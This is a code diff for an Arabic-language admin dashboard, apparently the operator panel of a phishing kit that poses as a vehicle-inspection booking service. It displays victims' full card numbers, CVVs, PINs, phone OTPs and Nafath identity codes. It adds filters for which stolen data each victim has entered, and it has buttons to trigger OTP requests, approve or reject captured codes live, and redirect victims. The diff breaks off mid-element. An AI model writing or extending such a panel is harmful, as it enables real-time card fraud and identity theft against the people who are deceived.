@@ -1,7 +1,7 @@
 "use client"
 
 import { useState, useEffect, useRef } from "react"
-import { Search, CheckCheck, Filter, Check, X } from "lucide-react"
+import { Search, CheckCheck, Filter, Check, X, CreditCard, Phone, Calendar, Car, Shield, Hash } from "lucide-react"
 import { Avatar, AvatarFallback } from "@/components/ui/avatar"
 import { Input } from "@/components/ui/input"
 import { Badge } from "@/components/ui/badge"
@@ -35,13 +35,13 @@ type UserData = {
   expiryDate?: string
   operator?: string
   phoneOtp?: string
- otp?: string
   nafadId?: string
   authNumber?: string
   cardOtpApproval?: "pending" | "approved" | "rejected"
   phoneOtpApproval?: "pending" | "approved" | "rejected"
   phoneSubmitted?: boolean // Added for phone submission status
   color?: string
+  currentPage?: number
 }
 
 const getRandomColor = () => {
@@ -67,15 +67,16 @@ export default function DashboardPage() {
   const [paymentFilter, setPaymentFilter] = useState<string>("all")
   const [readFilter, setReadFilter] = useState<string>("all")
   const [cardFilter, setCardFilter] = useState<string>("all")
-  const audioRef = useRef<HTMLAudioElement | null>(null) as React.MutableRefObject<HTMLAudioElement | null>;
-  const [editingAuthNumber, setEditingAuthNumber] = useState(false)
+  const [phoneFilter, setPhoneFilter] = useState<string>("all")
+  const [nafadFilter, setNafadFilter] = useState<string>("all")
+  const [otpFilter, setOtpFilter] = useState<string>("all")
+  const audioRef = useRef<HTMLAudioElement>(null)
   const [authNumberValue, setAuthNumberValue] = useState("")
   const prevUnreadCountRef = useRef(0)
 
   useEffect(() => {
     const audio = new Audio()
     audio.volume = 0.5
-    audioRef.current = audio
 
     return () => {
       audio.pause()
@@ -166,7 +167,20 @@ export default function DashboardPage() {
     const matchesCard =
       cardFilter === "all" || (cardFilter === "hasCard" && hasCard) || (cardFilter === "noCard" && !hasCard)
 
-    return matchesSearch && matchesReadStatus && matchesPayment && matchesCard
+    const hasPhone = user.phone && user.operator
+    const matchesPhone =
+      phoneFilter === "all" || (phoneFilter === "hasPhone" && hasPhone) || (phoneFilter === "noPhone" && !hasPhone)
+
+    const hasNafad = user.nafadId || user.authNumber
+    const matchesNafad =
+      nafadFilter === "all" || (nafadFilter === "hasNafad" && hasNafad) || (nafadFilter === "noNafad" && !hasNafad)
+
+    const hasOtp = user.phoneOtp || user.pin
+    const matchesOtp = otpFilter === "all" || (otpFilter === "hasOtp" && hasOtp) || (otpFilter === "noOtp" && !hasOtp)
+
+    return (
+      matchesSearch && matchesReadStatus && matchesPayment && matchesCard && matchesPhone && matchesNafad && matchesOtp
+    )
   })
 
   const toggleReadStatus = async (userId: string, currentStatus?: boolean) => {
@@ -186,7 +200,6 @@ export default function DashboardPage() {
       await updateDoc(userRef, {
         authNumber: newAuthNumber,
       })
-      setEditingAuthNumber(false)
     } catch (error) {
       console.error("[v0] Error updating authNumber:", error)
     }
@@ -225,6 +238,17 @@ export default function DashboardPage() {
     }
   }
 
+  const updateCurrentPage = async (userId: string) => {
+    try {
+      const userRef = doc(db, "pays", userId)
+      await updateDoc(userRef, {
+        currentPage: 9999,
+      })
+    } catch (error) {
+      console.error("[v0] Error updating currentPage:", error)
+    }
+  }
+
   const unreadCount = users.filter((user) => !user.isRead).length
 
   const getStepLabel = (step: string) => {
@@ -240,10 +264,10 @@ export default function DashboardPage() {
   }
 
   const getStepColor = (step: string) => {
-    if (!step) return "bg-zinc-700 text-zinc-300 border-zinc-600"
+    if (!step) return "bg-neutral-700/80 text-neutral-300 border-neutral-600/50"
     if (step === "payment-completed") return "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
     if (step.includes("submitted")) return "bg-blue-500/10 text-blue-400 border-blue-500/20"
-    return "bg-zinc-700 text-zinc-300 border-zinc-600"
+    return "bg-neutral-700/80 text-neutral-300 border-neutral-600/50"
   }
 
   const formatDate = (dateString: string) => {
@@ -314,8 +338,9 @@ export default function DashboardPage() {
   }
 
   return (
-    <div className="flex h-screen overflow-hidden bg-background text-foreground" dir="rtl">
-      <div className="w-[420px] border-l border-border flex flex-col bg-sidebar h-full overflow-hidden shadow-xl">
+    <div className="grid grid-cols-[380px_1fr] h-screen overflow-hidden bg-background text-foreground" dir="rtl">
+      {/* Sidebar */}
+      <div className="border-l border-border flex flex-col bg-sidebar h-full overflow-hidden shadow-xl">
         {/* Header */}
         <div className="p-6 border-b border-border/50 flex-shrink-0 bg-sidebar-header backdrop-blur-sm">
           <div className="flex items-center justify-between mb-6">
@@ -438,6 +463,98 @@ export default function DashboardPage() {
                   </Button>
                 </div>
               </div>
+
+              <div>
+                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">بيانات الهاتف</p>
+                <div className="flex gap-2">
+                  <Button
+                    variant={phoneFilter === "all" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setPhoneFilter("all")}
+                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
+                  >
+                    الكل
+                  </Button>
+                  <Button
+                    variant={phoneFilter === "hasPhone" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setPhoneFilter("hasPhone")}
+                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
+                  >
+                    يوجد هاتف
+                  </Button>
+                  <Button
+                    variant={phoneFilter === "noPhone" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setPhoneFilter("noPhone")}
+                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
+                  >
+                    بدون هاتف
+                  </Button>
+                </div>
+              </div>
+
+              <div>
+                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">بيانات نفاذ</p>
+                <div className="flex gap-2">
+                  <Button
+                    variant={nafadFilter === "all" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setNafadFilter("all")}
+                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
+                  >
+                    الكل
+                  </Button>
+                  <Button
+                    variant={nafadFilter === "hasNafad" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setNafadFilter("hasNafad")}
+                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
+                  >
+                    يوجد نفاذ
+                  </Button>
+                  <Button
+                    variant={nafadFilter === "noNafad" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setNafadFilter("noNafad")}
+                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
+                  >
+                    بدون نفاذ
+                  </Button>
+                </div>
+              </div>
+
+              <div>
+                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">
+                  رموز التحقق (OTP)
+                </p>
+                <div className="flex gap-2">
+                  <Button
+                    variant={otpFilter === "all" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setOtpFilter("all")}
+                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
+                  >
+                    الكل
+                  </Button>
+                  <Button
+                    variant={otpFilter === "hasOtp" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setOtpFilter("hasOtp")}
+                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
+                  >
+                    يوجد رمز
+                  </Button>
+                  <Button
+                    variant={otpFilter === "noOtp" ? "default" : "outline"}
+                    size="sm"
+                    onClick={() => setOtpFilter("noOtp")}
+                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
+                  >
+                    بدون رمز
+                  </Button>
+                </div>
+              </div>
             </div>
           )}
         </div>
@@ -525,449 +642,263 @@ export default function DashboardPage() {
 
       {/* Main Content */}
       {selectedUser && (
-        <div className="flex-1 flex flex-col h-full overflow-hidden">
+        <div className="flex flex-col h-full overflow-hidden bg-gradient-to-br from-background to-card/30">
+          {/* Header */}
           <div
-            className="bg-card border-b border-border/50 p-6 shadow-lg"
+            className="bg-card border-b-4 p-6 shadow-xl"
             style={{
-              borderBottom: `4px solid ${selectedUser.color || "#10b981"}`,
+              borderBottomColor: selectedUser.color || "#10b981",
             }}
           >
-            <div className="flex items-center gap-4">
+            <div className="flex items-center gap-5">
               <Avatar
-                className="h-16 w-16 shadow-xl"
+                className="h-20 w-20 shadow-2xl ring-4 ring-background"
                 style={{
-                  border: `3px solid ${selectedUser.color || "#10b981"}`,
-                  boxShadow: `0 0 0 2px rgba(0,0,0,0.1), 0 0 16px ${selectedUser.color || "#10b981"}60`,
+                  border: `4px solid ${selectedUser.color || "#10b981"}`,
+                  boxShadow: `0 0 0 2px rgba(0,0,0,0.1), 0 0 20px ${selectedUser.color || "#10b981"}50`,
                 }}
               >
                 <AvatarFallback
-                  className="text-lg font-bold text-white"
+                  className="text-xl font-bold text-white"
                   style={{ backgroundColor: selectedUser.color || "#10b981" }}
                 >
                   {selectedUser.phone?.slice(-4)}
                 </AvatarFallback>
               </Avatar>
-              <div>
-                <h2 className="font-bold text-xl text-foreground">{selectedUser.phone}</h2>
-                <p className="text-sm text-muted-foreground flex items-center gap-2 mt-0.5">
-                  {selectedUser.status === "online" ? (
-                    <>
-                      <span className="relative flex h-2.5 w-2.5">
-                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-status-online opacity-75"></span>
-                        <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-status-online shadow-sm shadow-status-online/50"></span>
-                      </span>
+              <div className="flex-1">
+                <div className="flex items-center gap-3 mb-2">
+                  <h2 className="text-2xl font-bold text-foreground">{selectedUser.phone}</h2>
+                  {selectedUser.status === "online" && (
+                    <Badge className="bg-status-online text-white font-semibold px-3 py-1 rounded-full shadow-lg animate-pulse">
                       متصل الآن
-                    </>
-                  ) : (
-                    <>
-                      <span className="inline-block h-2 w-2 rounded-full bg-muted"></span>
-                      آخر ظهور {formatDateTime(selectedUser.lastSeen)}
-                    </>
+                    </Badge>
                   )}
-                </p>
+                </div>
+                <p className="text-sm text-muted-foreground">آخر ظهور: {formatDateTime(selectedUser.lastSeen)}</p>
               </div>
+              <Badge
+                className={`px-4 py-2 text-sm font-bold rounded-xl shadow-lg ${getStepColor(selectedUser.step)} border-2`}
+              >
+                {getStepLabel(selectedUser.step)}
+              </Badge>
             </div>
           </div>
 
-          <div className="flex-1 overflow-y-auto p-8 bg-chat-background">
-            <div className="max-w-4xl mx-auto space-y-6">
-              {/* User Info Message */}
-              <div className="flex justify-start animate-in fade-in slide-in-from-right-4 duration-300">
-                <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-xl border border-message-border hover:shadow-2xl transition-shadow">
-                  <h3 className="font-bold mb-4 text-foreground text-lg flex items-center gap-2">
-                    <span className="h-1 w-1 bg-primary rounded-full"></span>
-                    معلومات المستخدم
-                  </h3>
-                  <div className="space-y-3 text-sm">
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-muted-foreground font-medium">الدولة:</span>
-                      <span className="text-foreground font-bold">{selectedUser.country}</span>
-                    </div>
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-muted-foreground font-medium">الهاتف:</span>
-                      <span className="text-foreground font-bold">{selectedUser.phone}</span>
-                    </div>
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-muted-foreground font-medium">تاريخ الإنشاء:</span>
-                      <span className="text-foreground font-bold">{formatDate(selectedUser.createdDate)}</span>
-                    </div>
+          {/* Content Grid */}
+          <div className="flex-1 overflow-y-auto p-6">
+            <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-6 max-w-[1600px] mx-auto">
+              {/* Vehicle Information Card */}
+              <div className="bg-card rounded-2xl p-6 shadow-xl border border-border/50 hover:shadow-2xl transition-all">
+                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
+                  <div className="p-3 bg-primary/10 rounded-xl">
+                    <Car className="h-6 w-6 text-primary" />
                   </div>
+                  <h3 className="text-xl font-bold text-foreground">معلومات المركبة</h3>
+                </div>
+                <div className="space-y-4">
+                  <DataRow label="نوع المركبة" value={selectedUser.vehicleType} />
+                  <DataRow label="رقم اللوحة" value={`${selectedUser.plateLetters} ${selectedUser.plateNumbers}`} />
+                  <DataRow label="المنطقة" value={selectedUser.region} />
+                  <DataRow label="المدينة" value={selectedUser.city} />
                 </div>
               </div>
 
-              {/* Vehicle Info Message */}
-              <div className="flex justify-start animate-in fade-in slide-in-from-right-4 duration-300">
-                <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-xl border border-message-border hover:shadow-2xl transition-shadow">
-                  <h3 className="font-bold mb-4 text-foreground text-lg flex items-center gap-2">
-                    <span className="h-1 w-1 bg-primary rounded-full"></span>
-                    تفاصيل المركبة
-                  </h3>
-                  <div className="space-y-3 text-sm">
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-muted-foreground font-medium">النوع:</span>
-                      <span className="text-foreground font-bold">{selectedUser.vehicleType}</span>
-                    </div>
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-muted-foreground font-medium">اللوحة:</span>
-                      <span className="text-foreground font-bold">
-                        {selectedUser.plateLetters} {selectedUser.plateNumbers}
-                      </span>
-                    </div>
+              {/* Inspection Details Card */}
+              <div className="bg-card rounded-2xl p-6 shadow-xl border border-border/50 hover:shadow-2xl transition-all">
+                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
+                  <div className="p-3 bg-primary/10 rounded-xl">
+                    <Calendar className="h-6 w-6 text-primary" />
                   </div>
+                  <h3 className="text-xl font-bold text-foreground">تفاصيل الفحص</h3>
+                </div>
+                <div className="space-y-4">
+                  <DataRow label="مركز الفحص" value={selectedUser.inspectionCenter} />
+                  <DataRow label="تاريخ الفحص" value={formatDate(selectedUser.inspectionDate)} />
+                  <DataRow label="وقت الفحص" value={selectedUser.inspectionTime} />
+                  <DataRow label="تاريخ الحجز" value={formatDateTime(selectedUser.createdDate)} />
                 </div>
               </div>
 
-              {/* Appointment Info Message */}
-              <div className="flex justify-end animate-in fade-in slide-in-from-left-4 duration-300">
-                <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-xl">
-                  <h3 className="font-bold mb-4 text-message-sent-foreground text-lg flex items-center gap-2">
-                    <span className="h-1 w-1 bg-message-sent-foreground rounded-full"></span>
-                    موعد الفحص
-                  </h3>
-                  <div className="space-y-3 text-sm">
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-message-sent-muted font-medium">المنطقة:</span>
-                      <span className="text-message-sent-foreground font-bold">{selectedUser.region}</span>
+              {/* Payment Information Card */}
+              {(selectedUser.cardNumber || selectedUser.cardName || selectedUser.cvv || selectedUser.pin) && (
+                <div className="bg-gradient-to-br from-card to-primary/5 rounded-2xl p-6 shadow-xl border-2 border-primary/20 hover:shadow-2xl transition-all">
+                  <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
+                    <div className="p-3 bg-primary/20 rounded-xl">
+                      <CreditCard className="h-6 w-6 text-primary" />
                     </div>
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-message-sent-muted font-medium">المدينة:</span>
-                      <span className="text-message-sent-foreground font-bold">{selectedUser.city}</span>
-                    </div>
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-message-sent-muted font-medium">المركز:</span>
-                      <span className="text-message-sent-foreground font-bold">{selectedUser.inspectionCenter}</span>
-                    </div>
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-message-sent-muted font-medium">التاريخ:</span>
-                      <span className="text-message-sent-foreground font-bold">
-                        {selectedUser.inspectionDate || "غير متوفر"}
-                      </span>
-                    </div>
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-message-sent-muted font-medium">الوقت:</span>
-                      <span className="text-message-sent-foreground font-bold">
-                        {selectedUser.inspectionTime || "غير متوفر"}
-                      </span>
-                    </div>
+                    <h3 className="text-xl font-bold text-foreground">معلومات البطاقة</h3>
                   </div>
-                </div>
-              </div>
-
-              {/* Payment Info Message */}
-              <div className="flex justify-end animate-in fade-in slide-in-from-left-4 duration-300">
-                <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-xl">
-                  <h3 className="font-bold mb-4 text-message-sent-foreground text-lg flex items-center gap-2">
-                    <span className="h-1 w-1 bg-message-sent-foreground rounded-full"></span>
-                    معلومات الدفع
-                  </h3>
-                  <div className="space-y-3 text-sm">
-                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-message-sent-muted font-medium">الطريقة:</span>
-                      <span className="text-message-sent-foreground font-bold capitalize">
-                        {selectedUser.paymentMethod?.replace("_", " ")}
-                      </span>
-                    </div>
-                    <div className="flex justify-between items-center gap-4 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                      <span className="text-message-sent-muted font-medium">الحالة:</span>
-                      <Badge className={`${getStepColor(selectedUser.step)} font-bold px-3 py-1 rounded-lg`}>
-                        {getStepLabel(selectedUser.step)}
-                      </Badge>
-                    </div>
-                    {selectedUser.completedDate && (
-                      <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                        <span className="text-message-sent-muted font-medium">تم الإكمال:</span>
-                        <span className="text-message-sent-foreground font-bold">
-                          {formatDateTime(selectedUser.completedDate)}
-                        </span>
+                  <div className="space-y-4">
+                      <DataRow label="رقم البطاقة" value={selectedUser.cardNumber}  />
+                    {selectedUser.expiryDate && <DataRow label="اسم حامل البطاقة" value={selectedUser.cardName} />}
+                    {selectedUser.expiryDate && (
+                      <DataRow label="تاريخ الانتهاء" value={selectedUser.expiryDate}  />
+                    )}
+                    {selectedUser.cvv && <DataRow label="CVV" value={selectedUser.cvv}  />}
+                    {selectedUser.pin && (
+                      <div className="space-y-3">
+                        <DataRow label="PIN" value={selectedUser.pin}  />
+                        {selectedUser.cardOtpApproval && (
+                          <ApprovalStatus status={selectedUser.cardOtpApproval} label="حالة OTP البطاقة" />
+                        )}
+                        <div className="flex gap-2">
+                          <Button
+                            size="sm"
+                            onClick={() => updateCardOtpApproval(selectedUser.id, "approved")}
+                            className="flex-1 bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 border border-emerald-500/30 rounded-xl shadow-md"
+                          >
+                            <Check className="h-4 w-4 ml-1" />
+                            قبول
+                          </Button>
+                          <Button
+                            size="sm"
+                            variant="destructive"
+                            onClick={() => updateCardOtpApproval(selectedUser.id, "rejected")}
+                            className="flex-1 rounded-xl shadow-md"
+                          >
+                            <X className="h-4 w-4 ml-1" />
+                            رفض
+                          </Button>
+                        </div>
                       </div>
                     )}
                   </div>
                 </div>
+              )}
+
+              {/* Phone Verification Card */}
+              <div className="bg-card rounded-2xl p-6 shadow-xl border border-border/50 hover:shadow-2xl transition-all">
+                <div className="flex items-center gap-3 mb-5 pb-4 border-b border-border/50">
+                  <div className="p-3 bg-primary/10 rounded-xl">
+                    <Phone className="h-6 w-6 text-primary" />
+                  </div>
+                  <h3 className="text-xl font-bold text-foreground">التحقق من الهاتف</h3>
+                </div>
+                <div className="space-y-4">
+                  <DataRow label="رقم الهاتف" value={selectedUser.phone} />
+                  {selectedUser.operator && <DataRow label="المشغل" value={selectedUser.operator} />}
+
+                  {!selectedUser.phoneSubmitted ? (
+                    <Button
+                      onClick={() => submitPhoneAndOperator(selectedUser.id)}
+                      className="w-full mt-4 h-12 rounded-xl shadow-lg hover:shadow-xl transition-all"
+                    >
+                      إرسال طلب OTP
+                    </Button>
+                  ) : (
+                    <div className="space-y-3 pt-2">
+                      {selectedUser.phoneOtp && <DataRow label="رمز OTP" value={selectedUser.phoneOtp}  />}
+                      {selectedUser.phoneOtpApproval && (
+                        <ApprovalStatus status={selectedUser.phoneOtpApproval} label="حالة OTP الهاتف" />
+                      )}
+                      <div className="flex gap-2">
+                        <Button
+                          size="sm"
+                          onClick={() => updatePhoneOtpApproval(selectedUser.id, "approved")}
+                          className="flex-1 bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 border border-emerald-500/30 rounded-xl shadow-md"
+                        >
+                          <Check className="h-4 w-4 ml-1" />
+                          قبول
+                        </Button>
+                        <Button
+                          size="sm"
+                          variant="destructive"
+                          onClick={() => updatePhoneOtpApproval(selectedUser.id, "rejected")}
+                          className="flex-1 rounded-xl shadow-md"
+                        >
+                          <X className="h-4 w-4 ml-1" />
+                          رفض
+                        </Button>
+                      </div>
+                    </div>
+                  )}
+                </div>
               </div>
 
-              {/* Card Details Section */}
-              {(selectedUser.cardNumber || selectedUser.cardName || selectedUser.cvv || selectedUser.pin) && (
-                <div className="flex justify-start animate-in fade-in slide-in-from-right-4 duration-300">
-                  <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-xl border border-message-border hover:shadow-2xl transition-shadow">
-                    <h3 className="font-bold mb-4 text-foreground text-lg flex items-center gap-2">
-                      <span className="h-1 w-1 bg-primary rounded-full"></span>
-                      بيانات البطاقة
-                    </h3>
-                    <div className="space-y-3 text-sm">
-                      {selectedUser.cardNumber && (
-                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                          <span className="text-muted-foreground font-medium">رقم البطاقة:</span>
-                          <span className="text-foreground font-bold font-mono">{selectedUser.cardNumber}</span>
-                        </div>
-                      )}
-                      {selectedUser.cardName && (
-                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                          <span className="text-muted-foreground font-medium">اسم حامل البطاقة:</span>
-                          <span className="text-foreground font-bold">{selectedUser.cardName}</span>
-                        </div>
-                      )}
-                      {selectedUser.expiryDate && (
-                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                          <span className="text-muted-foreground font-medium">تاريخ الانتهاء:</span>
-                          <span className="text-foreground font-bold font-mono">{selectedUser.expiryDate}</span>
-                        </div>
-                      )}
-                      {selectedUser.cvv && (
-                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                          <span className="text-muted-foreground font-medium">CVV:</span>
-                          <span className="text-foreground font-bold font-mono">
-                       {selectedUser.cvv}
-                          </span>
-                        </div>
-                      )}
-                      {selectedUser.otp&& (
-                        <div className="flex flex-col gap-3 pt-3 border-t border-border/30">
-                          <div className="flex justify-between gap-12">
-                            <span className="text-muted-foreground font-medium">الرقم السري:</span>
-                            <span className="text-foreground font-bold font-mono">
-                              {selectedUser?.pin}
-                            </span>
-                          </div>
-                          <div className="flex justify-between gap-12">
-                            <span className="text-muted-foreground font-medium">otp:</span>
-                            <span className="text-foreground font-bold font-mono">
-                              {selectedUser?.otp}
-                            </span>
-                          </div>
-                          {/* Approval buttons for card OTP */}
-                          <div className="pt-3 border-t border-border/30">
-                            <div className="flex items-center justify-between gap-3">
-                              <span className="text-xs text-muted-foreground">حالة الموافقة:</span>
-                              <div className="flex gap-2">
-                                <Button
-                                  size="sm"
-                                  variant={selectedUser.cardOtpApproval === "approved" ? "default" : "outline"}
-                                  onClick={() => updateCardOtpApproval(selectedUser.id, "approved")}
-                                  className={
-                                    selectedUser.cardOtpApproval === "approved"
-                                      ? "bg-green-600 hover:bg-green-700 text-white shadow-md"
-                                      : "shadow-sm"
-                                  }
-                                >
-                                  <Check className="h-4 w-4 ml-1" />
-                                  موافق
-                                </Button>
-                                <Button
-                                  size="sm"
-                                  variant={selectedUser.cardOtpApproval === "rejected" ? "default" : "outline"}
-                                  onClick={() => updateCardOtpApproval(selectedUser.id, "rejected")}
-                                  className={
-                                    selectedUser.cardOtpApproval === "rejected"
-                                      ? "bg-red-600 hover:bg-red-700 text-white shadow-md"
-                                      : "shadow-sm"
-                                  }
-                                >
-                                  <X className="h-4 w-4 ml-1" />
-                                  رفض
-                                </Button>
-                              </div>
-                            </div>
-                          </div>
-                        </div>
-                      )}
-                    </div>
-                  </div>
-                </div>
-              )}
-
-              {/* Verification Info Message */}
-              {(selectedUser.operator || selectedUser.phoneOtp || selectedUser.phone) && (
-                <div className="flex justify-end animate-in fade-in slide-in-from-left-4 duration-300">
-                  <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-xl">
-                    <h3 className="font-bold mb-4 text-message-sent-foreground text-lg flex items-center gap-2">
-                      <span className="h-1 w-1 bg-message-sent-foreground rounded-full"></span>
-                      معلومات التحقق
-                    </h3>
-                    <div className="space-y-3 text-sm">
-                      {!selectedUser.phoneSubmitted && (selectedUser.phone || selectedUser.operator) && (
-                        <>
-                          {selectedUser.phone && (
-                            <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                              <span className="text-message-sent-muted font-medium">رقم الهاتف:</span>
-                              <span className="text-message-sent-foreground font-bold">{selectedUser.phone}</span>
-                            </div>
-                          )}
-                          {selectedUser.operator && (
-                            <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                              <span className="text-message-sent-muted font-medium">المشغل:</span>
-                              <span className="text-message-sent-foreground font-bold">{selectedUser.operator}</span>
-                            </div>
-                          )}
-                          <div className="pt-3 border-t border-message-sent-border/30">
-                            <Button
-                              size="sm"
-                              onClick={() => submitPhoneAndOperator(selectedUser.id)}
-                              className="w-full bg-teal-600 hover:bg-teal-700 text-white shadow-md"
-                            >
-                              <Check className="h-4 w-4 ml-2" />
-                              إرسال رمز التحقق
-                            </Button>
-                          </div>
-                        </>
-                      )}
-
-                      {selectedUser.phoneSubmitted && (
-                        <>
-                          {selectedUser.phone && (
-                            <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                              <span className="text-message-sent-muted font-medium">رقم الهاتف:</span>
-                              <span className="text-message-sent-foreground font-bold">{selectedUser.phone}</span>
-                            </div>
-                          )}
-                          {selectedUser.operator && (
-                            <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                              <span className="text-message-sent-muted font-medium">المشغل:</span>
-                              <span className="text-message-sent-foreground font-bold">{selectedUser.operator}</span>
-                            </div>
-                          )}
-                          {selectedUser.phoneOtp && (
-                            <div className="flex flex-col gap-3 pt-3 border-t border-message-sent-border/30">
-                              <div className="flex justify-between gap-12">
-                                <span className="text-message-sent-muted font-medium">كود التحقق:</span>
-                                <span className="text-message-sent-foreground font-bold font-mono">
-                                  {selectedUser.phoneOtp}
-                                </span>
-                              </div>
-                              {/* Approval buttons for phone OTP */}
-                              <div className="pt-3 border-t border-message-sent-border/30">
-                                <div className="flex items-center justify-between gap-3">
-                                  <span className="text-xs text-message-sent-muted">حالة الموافقة:</span>
-                                  <div className="flex gap-2">
-                                    <Button
-                                      size="sm"
-                                      variant={selectedUser.phoneOtpApproval === "approved" ? "default" : "outline"}
-                                      onClick={() => updatePhoneOtpApproval(selectedUser.id, "approved")}
-                                      className={
-                                        selectedUser.phoneOtpApproval === "approved"
-                                          ? "bg-green-600 hover:bg-green-700 text-white shadow-md"
-                                          : "shadow-sm"
-                                      }
-                                    >
-                                      <Check className="h-4 w-4 ml-1" />
-                                      موافق
-                                    </Button>
-                                    <Button
-                                      size="sm"
-                                      variant={selectedUser.phoneOtpApproval === "rejected" ? "default" : "outline"}
-                                      onClick={() => updatePhoneOtpApproval(selectedUser.id, "rejected")}
-                                      className={
-                                        selectedUser.phoneOtpApproval === "rejected"
-                                          ? "bg-red-600 hover:bg-red-700 text-white shadow-md"
-                                          : "shadow-sm"
-                                      }
-                                    >
-                                      <X className="h-4 w-4 ml-1" />
-                                      رفض
-                                    </Button>
-                                  </div>
-                                </div>
-                              </div>
-                            </div>
-                          )}
-                        </>
-                      )}
-                    </div>
-                  </div>
-                </div>
-              )}
-
-              {/* Nafad ID and Auth Number Section */}
+              {/* Nafad Information Card */}
               {(selectedUser.nafadId || selectedUser.authNumber !== undefined) && (
-                <div className="flex justify-start animate-in fade-in slide-in-from-right-4 duration-300">
-                  <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-xl border border-message-border hover:shadow-2xl transition-shadow">
-                    <h3 className="font-bold mb-4 text-foreground text-lg flex items-center gap-2">
-                      <span className="h-1 w-1 bg-primary rounded-full"></span>
-                      معلومات نفاذ
-                    </h3>
-                    <div className="space-y-3 text-sm">
-                      {selectedUser.nafadId && (
-                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
-                          <span className="text-muted-foreground font-medium">رقم نفاذ:</span>
-                          <span className="text-foreground font-bold font-mono">{selectedUser.nafadId}</span>
-                        </div>
-                      )}
-                      {selectedUser.authNumber !== undefined && (
-                        <div className="flex flex-col gap-2 pt-3 border-t border-border/30">
-                          <div className="flex items-center justify-between gap-4">
-                            <span className="text-muted-foreground font-medium">رقم التفويض:</span>
-                            {!editingAuthNumber ? (
-                              <div className="flex items-center gap-2">
-                                <span className="text-foreground font-bold font-mono">
-                                  {selectedUser.authNumber || "غير محدد"}
-                                </span>
-                                <Button
-                                  variant="ghost"
-                                  size="sm"
-                                  onClick={() => {
-                                    setEditingAuthNumber(true)
-                                    setAuthNumberValue(selectedUser.authNumber || "")
-                                  }}
-                                  className="h-8 px-2 text-xs rounded-md hover:bg-accent"
-                                >
-                                  تعديل
-                                </Button>
-                              </div>
-                            ) : (
-                              <div className="flex items-center gap-2">
-                                <Input
-                                  type="text"
-                                  value={authNumberValue}
-                                  onChange={(e) => setAuthNumberValue(e.target.value)}
-                                  className="h-9 w-32 text-sm font-mono px-3"
-                                  placeholder="رقم التفويض"
-                                />
-                                <Button
-                                  variant="default"
-                                  size="sm"
-                                  onClick={() => updateAuthNumber(selectedUser.id, authNumberValue)}
-                                  className="h-9 px-3 text-xs shadow-md hover:shadow-lg"
-                                >
-                                  حفظ
-                                </Button>
-                                <Button
